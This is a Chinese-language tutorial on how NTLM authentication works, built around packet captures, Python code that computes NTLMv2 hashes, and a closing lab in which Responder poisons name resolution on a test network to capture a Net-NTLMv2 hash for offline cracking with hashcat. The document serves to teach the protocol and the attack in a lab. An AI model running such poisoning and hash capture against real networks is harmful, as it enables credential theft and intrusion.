<h1 id="工作组下NTLM协议认证机制"><a href="#工作组下NTLM协议认证机制" class="headerlink" title="工作组下NTLM协议认证机制"></a>工作组下NTLM协议认证机制</h1><p>NTLM协议是一种基于**Challenge&#x2F;Response(质询&#x2F;响应)**的验证机制，由三种消息组成</p>
<ol>
<li>Type1:协商(Negotiate)</li>
<li>Type2:质询(Challenge)</li>
<li>Type3:认证(Authentication)</li>
</ol>
<p>NTLM协议由<code>V1</code>和<code>v2</code>两个版本，两者主要区别是Challenge值和加密算法的不同，共同之处都使用<strong>NTLM Hash</strong>加密<br><img src="https://ooo.0x0.ooo/2024/05/11/OJU6Za.png" alt="OJU6Za.png" loading="lazy"></p>
<ol>
<li>当客户端需要访问服务器的某个服务时，就需要进行身份认证。于是，在客户端输入服务器的用户名和密码进行验证之后，就会缓存服务器密码的<code>NTLM Hash</code>值。然后，客户端会向服务端发送一个请求，该请求利用<strong>NTLM SSP</strong>生成<strong>NTLMSSP_ NEGOTIATE</strong>消息(被称为Type1协商消息)。</li>
<li>服务端接收到客户端发送过来的Type1消息后，读取其中的内容，并从中选择自己所能接受的服务内容、加密等级、安全服务等，然后传入<strong>NTLM SSP</strong>,得到<strong>NTLMSSP_CHALLENGE</strong>消息(被称为Type2质询消息)，并将此Type2消息发回给客户端。在此Type2消息中包含一个由服务端生成的<strong>16位随机值</strong>，被称为<strong>Challenge</strong>值，服务端会将该Challenge值进行缓存。</li>
<li>客户端收到服务端返回的Type2消息后，读取服务端所支持的内容，并取出其中的<strong>Challenge</strong>值，用缓存的服务器密码的<strong>NTLM Hash</strong>对其进行加密得到<strong>Response</strong>消息。最后将<strong>Response</strong>和一些其他信息封装到<strong>NTLMSSP_AUTH</strong>消息中（被称为Type3认证消息），发往服务端。</li>
<li>服务端收到认证消息后，从中取出<strong>Net-NTLM Hash</strong>,然后用自己密码的<strong>NTLM Hash</strong>对<strong>Challenge</strong>值进行一系列加密运算，得到自己计算的<strong>Net-NTLM Hash</strong>,并比较自己计算出的<strong>Net-NTLM Hash</strong>和客户端发送的<strong>Net-NTLM Hash</strong>是否相等。如果相等，则证明客户端输人的密码正确，从而认证成功，反之则认证失败。</li>
</ol>
<h2 id="实验检验"><a href="#实验检验" class="headerlink" title="实验检验"></a>实验检验</h2><p>SMB 服务端 192.168.31.178<br>客户端 192.168.31.34<br><img src="https://ooo.0x0.ooo/2024/05/10/OJqu2s.png" alt="OJqu2s.png" loading="lazy"><br>先在kali上打开wireshark，然后smb连接win10服务端</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># smbclient //192.168.31.178/Users -U test</span>
Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>test<span class="token punctuation">]</span>:
Try <span class="token string">"help"</span> to get a list of possible commands.
smb: <span class="token punctuation">\</span><span class="token operator">></span> </code></pre>
<p><img src="https://ooo.0x0.ooo/2024/05/10/OJqwVS.png" alt="OJqwVS.png" loading="lazy"><br>根据抓包可以看到一个标志性的包，<code>NTLMSSP_ NEGOTIATE</code>,<code>NTLMSSP_CHALLENGE</code>,<code>NTLMSSP_AUTH</code><br>分别来看看几个阶段</p>
<ol>
<li>协商<br><img src="https://ooo.0x0.ooo/2024/05/10/OJ5hAv.png" alt="OJ5hAv.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/05/10/OJ5iSq.png" alt="OJ5iSq.png" loading="lazy"><br><strong>security mode</strong>的<strong>Signing enabled</strong>为True，<strong>Signing required</strong>为False表明客户端支持签名， 但是协商不签名。工作组环境下默认都不签名。</li>
<li>Negotiate包<br>第五个包是Negotiate包<br>一些需要协商的flag<br><img src="https://ooo.0x0.ooo/2024/05/10/OJ5nCc.png" alt="OJ5nCc.png" loading="lazy"></li>
<li>Challenge包<br>第6个包是Challenge包，由服务端发往客户端，可以看到challenge值<br><img src="https://ooo.0x0.ooo/2024/05/10/OJ57nr.png" alt="OJ57nr.png" loading="lazy"></li>
<li>Authenticate包<br>在response中有6中响应类型<ol>
<li>LM响应，由低版本客户端发送</li>
<li>NTLM v1响应，这是基于NT的客户端发送，包括Windows 2000 和xp</li>
<li>HTLM v2响应，在Windows NT Server Pack4中引入一种较新的响应类型。他替换启动了NTLM v2系统上的NTLM响应</li>
<li>LM v2响应，替换NTLM v2系统上的LM响应</li>
<li>NTLM v2会话响应，用于在没有NTLM v2身份验证的情况下协商NTLM v2会话安全性，此方案会更改LM NTLM响应的语义</li>
<li>匿名响应，当匿名上下文正在建立时使用，没有提供实际的证书，也没有真正的身份验证。“存根”字段显示在Type3消息中<br>这6中响应类型使用的加密流程一样，都上前面所说的Challenge&#x2F;Response验证机制，不同之处在于Challenge值和加密算法。至于选择哪种由LmCompatibility-Level决定。<br><img src="https://ooo.0x0.ooo/2024/05/10/OJ5NDM.png" alt="OJ5NDM.png" loading="lazy"><br>本次测试可以看到是NTLM v2类型的响应，在该字段下可以看到<strong>NTProofStr</strong>字段，该字段的值是用做数据签名的Hash(HMAC-MD5)值，目的是保证数据的完整性。<br>NTLMv2 Hash&#x3D;HMAC-MD5(unicode(hex((upper(Username)+DomainName))),NTLM_Hash)<br>NTProofStr&#x3D;HMAC-MD5(challenge+blob,NTLMv2 Hash)<br>微软为了防止数据包被中途篡改，使用<strong>exportedSessionKey</strong>加密三个NTLM消息来保证数据包的完整性，而由于<strong>exportedSessionKey</strong>仅对启动认证的账户和目标服务器已知，因此有了MIC，攻击者于是无法通过篡改NTLM认证数据包。<br>MIC&#x3D;HMAC_MD5(exportedSessionKey,NEGOTIATE_MESSAGE+CHALLENGE_MESSAGE+AUTHENTICATE_MESSAGE)<br><img src="https://ooo.0x0.ooo/2024/05/10/OJ5e6G.png" alt="OJ5e6G.png" loading="lazy"></li>
</ol>
</li>
<li>返回成功与否<br>第8个数据包返回成功的结果</li>
<li>签名<br>在认证完成后，根据协商的字段值来确定是否需要对后续数据包进行签名。<br><img src="https://ooo.0x0.ooo/2024/05/10/OJ5e6G.png" alt="OJ5e6G.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/05/10/OJ5HpK.png" alt="OJ5HpK.png" loading="lazy"><br>在第7个数据包中可以看到<strong>Session Key</strong>字段，<strong>Session Key</strong>是用来进行协商加密密钥的。<br>看下<strong>Session Key</strong>的生成函数<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">generateEncryptedSessionKey</span><span class="token punctuation">(</span>keyExchangeKey<span class="token punctuation">,</span>exportedSessionKey<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cipher<span class="token operator">=</span>ARC4<span class="token punctuation">.</span>new<span class="token punctuation">(</span>keyExchangeKey<span class="token punctuation">)</span>
    cipher_encrypt<span class="token operator">=</span>cipher<span class="token punctuation">.</span>encrypt
    sessionKey<span class="token operator">=</span>cipher_encrypt<span class="token punctuation">(</span>exportedSessionKey<span class="token punctuation">)</span>
    <span class="token keyword">return</span> sessionKey</code></pre>
Session Key是由keyExchangeKey和exportedSessionKey经过一系列运算得到<br>再看下keyExchangeKey是如何生成<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">KXKEY</span><span class="token punctuation">(</span>flags<span class="token punctuation">,</span>sessionBaseKey<span class="token punctuation">,</span>lmChallengeResponse<span class="token punctuation">,</span>serverChallenge<span class="token punctuation">,</span>password<span class="token punctuation">,</span>lmhash<span class="token punctuation">,</span>nthash<span class="token punctuation">,</span>use_ntlmv2<span class="token operator">=</span>USE_NTLMv2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> use_ntlmv2<span class="token punctuation">:</span>
        <span class="token keyword">return</span> sessionBaseKey
    <span class="token keyword">if</span> flags <span class="token operator">&amp;</span> NTLMSSP_NEGOTIATE_EXTENDED_SESSIONCURITY<span class="token punctuation">:</span>
        <span class="token keyword">if</span> flags <span class="token operator">&amp;</span> NTLMSSP_NEGOTIATE_NTLM_SESSIONSECURITY<span class="token punctuation">:</span>
            keyExchangeKey<span class="token operator">=</span>hmac_md5<span class="token punctuation">(</span>sessionBaseKey<span class="token punctuation">,</span>serverChallenge<span class="token operator">+</span>lmChallengeResponse<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span>
            keyExchangeKey<span class="token operator">=</span>sessionBaseKey
    <span class="token keyword">elif</span> flags <span class="token operator">&amp;</span> NTLMSSP_NEGOTIATE_NTLM<span class="token punctuation">:</span>
        <span class="token keyword">if</span> flags <span class="token operator">&amp;</span> NTLMSSP_NEGOTIATE_LM_KEY<span class="token punctuation">:</span>
            keyExchangeKey<span class="token operator">=</span>__DES_block<span class="token punctuation">(</span>LMOWFv1<span class="token punctuation">(</span>password<span class="token punctuation">,</span>lmhash<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span>lmChallengeResponse<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>__DES_block<span class="token punctuation">(</span>LMOWFv1<span class="token punctuation">(</span>password<span class="token punctuation">,</span>lmhash<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">b'\xBD\xBD\xBD\xBD\xBD\xBD'</span><span class="token punctuation">,</span>lmChallengeResponse<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> flags <span class="token operator">&amp;</span> NTLMSSP_REQUEST_NON_NT_SESION_KEY<span class="token punctuation">:</span>
            keyExchangeKey<span class="token operator">=</span>LMOWFv1<span class="token punctuation">(</span>password<span class="token punctuation">,</span>lmhash<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">8</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            keyExchangeKey<span class="token operator">=</span>sessionBaseKey
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Can't create a valid KXKEY"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> keyExchangeKey</code></pre>
<strong>keyExchangeKey</strong>是由<strong>password</strong>和<strong>serverChallenge</strong>等值经过一系列运算得到<br>而exportedSessionKey是客户端生成的随机数，用来加解密liu’l，代码如下<br>exportedSessionKey &#x3D; b(“”.join([random.choice(string.digists+string.ascii_letters) for _  in range(16)]))</li>
</ol>
<p>客户端和服务端通过<strong>Session Key</strong>协商密钥过程如下<br>首先，客户端会生成一个随机数<strong>exportedSessionKey</strong>，后续都使用这个<strong>exportedSessionKey</strong>来加解密流量。<strong>exportedSessionKey</strong>是客户端生成的，服务端并不知道。<br>客户端使用<strong>keyExchangeKey</strong>作为Key，用<strong>CR4</strong>加密算法加密<strong>exportedSessionKey</strong>，得到的流量中看到<strong>Session Key</strong>。服务器端拿到流量后，使用用户密码和Challenge值经过运算生成<strong>keyExchangeKey</strong>,然后使用Session<br>Key与KeyExchangeKey一起运算得到<strong>exportedSessionKey</strong>,最后使用<strong>exportedSessionKey</strong>加解密流量。对于攻击者来说，由于没有用户的密码，因此无法生成keyExchangeKey。所以，攻击者即使拿到了流量，也无法计算出<strong>exportedSessionKey</strong>，自然无法解密流量。</p>
<h2 id="Net-NTLM-v2-Hash的计算"><a href="#Net-NTLM-v2-Hash的计算" class="headerlink" title="Net-NTLM v2 Hash的计算"></a>Net-NTLM v2 Hash的计算</h2><p>NTLM v2的Response消息生成过程:</p>
<ol>
<li>将大写的<strong>Username</strong>和<strong>Domain name</strong>(区分大小写)拼接在一起转换成16进制，然后双字节Unicode编码得到<strong>data</strong>，接着使用16B NTLM哈希值作为密钥key，用data和key进行<strong>HMAC_MD5</strong>加密得到<strong>NTLM v2 Hash</strong></li>
<li>构建一个blob信息</li>
<li>使用16字节<strong>NTLM v2 Hash</strong>作为密钥，将<strong>HMAC_MD5</strong>消息认证代码算法加密一个值(来自Type2的Challenge与blob拼接在一起)，得到一个16B的<strong>NTProotStr(HMAC_MD5)</strong></li>
<li>将<strong>NTProofStr</strong>与<strong>blob</strong>拼接得到<strong>Response</strong><br>使用<strong>Responder</strong>工具抓取<strong>NTLM Response</strong>消息的时候，抓取的都是<strong>Net-NTLM Hash</strong>格式的数据<br>Net-NTLM v2 Hash的格式:<br><strong>username::domain:challenge:HMAC_MD5:blob</strong><br>username: 要访问服务器的用户名<br>domain: 域信息<br>challenge: 数据包6中服务器返回challenge值<br>HMAC-MD5: 数据包7中的NTProofStr<br>blob: 数据包7中NTLM v2 Response去掉NTProofStr的后半部分<pre class="language-none"><code class="language-none">NTLM v2 Hash&#x3D;HMAC-MD5(unicode(hex((upper(UserName)+DomainName))),NTLM Hash)
NTProofStr&#x3D;HMAC-MD5(challenge+blob,NTLMv2 Hash)</code></pre>
计算NTLM v2 Hash，NTProofStr以及Response值的代码如下<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hmac
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> binascii
<span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">for</span> t <span class="token keyword">in</span> string<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hex_to_unicode</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> string<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"00"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"00"</span>
<span class="token keyword">def</span> <span class="token function">Ntlm_hash</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"md4"</span><span class="token punctuation">,</span>string<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-16le"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hmac_md5</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span>binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> __name__<span class="token operator">=</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    username<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input Username:"</span><span class="token punctuation">)</span>
    password<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input Password:"</span><span class="token punctuation">)</span>
    domain_name<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input Domain_name:"</span><span class="token punctuation">)</span>
    challenge<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input Challenge:"</span><span class="token punctuation">)</span>
    blob<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input blob:"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span>
    HEX<span class="token operator">=</span>str_to_hex<span class="token punctuation">(</span>username<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>domain_name<span class="token punctuation">)</span>
    data<span class="token operator">=</span>hex_to_unicode<span class="token punctuation">(</span>HEX<span class="token punctuation">)</span>
    key<span class="token operator">=</span>Ntlm_hash<span class="token punctuation">(</span>password<span class="token punctuation">)</span>
    NTLM_v2_Hash<span class="token operator">=</span>hmac_md5<span class="token punctuation">(</span>key<span class="token punctuation">,</span>data<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"NTLM_v2_Hash:"</span><span class="token operator">+</span>NTLM_v2_Hash<span class="token punctuation">)</span>
    data2<span class="token operator">=</span>challenge<span class="token operator">+</span>blob
    NTProofStr<span class="token operator">=</span>hmac_md5<span class="token punctuation">(</span>NTLM_v2_Hash<span class="token punctuation">,</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"NTProofStr:"</span><span class="token operator">+</span>NTProofStr<span class="token punctuation">)</span>
    Response<span class="token operator">=</span>username<span class="token operator">+</span><span class="token string">"::"</span><span class="token operator">+</span>domain_name<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>challenge<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>NTProofStr<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>blob
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Response:"</span><span class="token operator">+</span>Response<span class="token punctuation">)</span></code></pre></li>
</ol>
<h2 id="responder实验"><a href="#responder实验" class="headerlink" title="responder实验"></a>responder实验</h2><p>下面实验验证一下Responder抓取NTLM v2 Responde消息然后使用hashcat进行爆破<br>攻击机kali:192.168.31.34<br>靶机win10:192.168.31.178<br>kali自带Responder直接使用即可</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># responder -I eth0     </span>
                                         __
  .----.-----.-----.-----.-----.-----.--<span class="token operator">|</span>  <span class="token operator">|</span>.-----.----.
  <span class="token operator">|</span>   _<span class="token operator">|</span>  -__<span class="token operator">|</span>__ --<span class="token operator">|</span>  _  <span class="token operator">|</span>  _  <span class="token operator">|</span>     <span class="token operator">|</span>  _  <span class="token operator">||</span>  -__<span class="token operator">|</span>   _<span class="token operator">|</span>
  <span class="token operator">|</span>__<span class="token operator">|</span> <span class="token operator">|</span>_____<span class="token operator">|</span>_____<span class="token operator">|</span>   __<span class="token operator">|</span>_____<span class="token operator">|</span>__<span class="token operator">|</span>__<span class="token operator">|</span>_____<span class="token operator">||</span>_____<span class="token operator">|</span>__<span class="token operator">|</span>
                   <span class="token operator">|</span>__<span class="token operator">|</span>

           NBT-NS, LLMNR <span class="token operator">&amp;</span> MDNS Responder <span class="token number">3.1</span>.4.0

  To support this project:
  Github -<span class="token operator">></span> https://github.com/sponsors/lgandx
  Paypal  -<span class="token operator">></span> https://paypal.me/PythonResponder

  Author: Laurent Gaffie <span class="token punctuation">(</span>laurent.gaffie@gmail.com<span class="token punctuation">)</span>
  To <span class="token function">kill</span> this script hit CTRL-C


<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Poisoners:
    LLMNR                      <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    NBT-NS                     <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    MDNS                       <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    DNS                        <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    DHCP                       <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Servers:
    HTTP server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    HTTPS server               <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    WPAD proxy                 <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Auth proxy                 <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    SMB server                 <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    Kerberos server            <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    SQL server                 <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    FTP server                 <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    IMAP server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    POP3 server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    SMTP server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    DNS server                 <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    LDAP server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    MQTT server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    RDP server                 <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    DCE-RPC server             <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    WinRM server               <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    SNMP server                <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> HTTP Options:
    Always serving EXE         <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Serving EXE                <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Serving HTML               <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Upstream Proxy             <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Poisoning Options:
    Analyze Mode               <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Force WPAD auth            <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Force Basic Auth           <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Force LM downgrade         <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Force ESS downgrade        <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Generic Options:
    Responder NIC              <span class="token punctuation">[</span>eth0<span class="token punctuation">]</span>
    Responder IP               <span class="token punctuation">[</span><span class="token number">192.168</span>.31.34<span class="token punctuation">]</span>
    Responder IPv6             <span class="token punctuation">[</span>fe80::20c:29ff:fed2:e049<span class="token punctuation">]</span>
    Challenge <span class="token builtin class-name">set</span>              <span class="token punctuation">[</span>random<span class="token punctuation">]</span>
    Don<span class="token string">'t Respond To Names     ['</span>ISATAP<span class="token string">', '</span>ISATAP.LOCAL'<span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Current Session Variables:
    Responder Machine Name     <span class="token punctuation">[</span>WIN-JNOQBZ1D6K9<span class="token punctuation">]</span>
    Responder Domain Name      <span class="token punctuation">[</span>NNLN.LOCAL<span class="token punctuation">]</span>
    Responder DCE-RPC Port     <span class="token punctuation">[</span><span class="token number">49009</span><span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Listening <span class="token keyword">for</span> events<span class="token punctuation">..</span>.                           </code></pre>
<p>开启监听eth0网卡<br>在win10靶机上访问一个不存在的共享目录比如\111\123,随便输入即可<br><img src="https://ooo.0x0.ooo/2024/05/11/OJBuya.png" alt="OJBuya.png" loading="lazy"><br>然后kali监听到信息，捕捉HTLM v2 Hash值</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>NBT-NS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name WIN-N5633OS4LCV <span class="token punctuation">(</span>service: Domain Controller<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>NBT-NS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name WORKGROUP <span class="token punctuation">(</span>service: Domain Master Browser<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178  <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>NBT-NS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name <span class="token number">111</span> <span class="token punctuation">(</span>service: File Server<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178  <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>SMB<span class="token punctuation">]</span> NTLMv2-SSP Client   <span class="token builtin class-name">:</span> fe80::4029:1fd8:cf61:59c2
<span class="token punctuation">[</span>SMB<span class="token punctuation">]</span> NTLMv2-SSP Username <span class="token builtin class-name">:</span> WIN-N5633OS4LCV<span class="token punctuation">\</span>test
<span class="token punctuation">[</span>SMB<span class="token punctuation">]</span> NTLMv2-SSP Hash     <span class="token builtin class-name">:</span> test::WIN-N5633OS4LCV:dd1d9a13318cceaf:684964EF5F83B204EE0B30077A88052F:01010000000000008043172396A3DA0106380B005DCDDA4D00000000020008004E004E004C004E0001001E00570049004E002D004A004E004F00510042005A003100440036004B00390004003400570049004E002D004A004E004F00510042005A003100440036004B0039002E004E004E004C004E002E004C004F00430041004C00030014004E004E004C004E002E004C004F00430041004C00050014004E004E004C004E002E004C004F00430041004C00070008008043172396A3DA0106000400020000000800300030000000000000000000000000200000CC6D994464DFABE76848136D66BF3068E7689FA0E037ECFFB9164FE9EECBE5B20A001000000000000000000000000000000000000900100063006900660073002F003100310031000000000000000000                                                                               
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178  <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name <span class="token number">111</span>
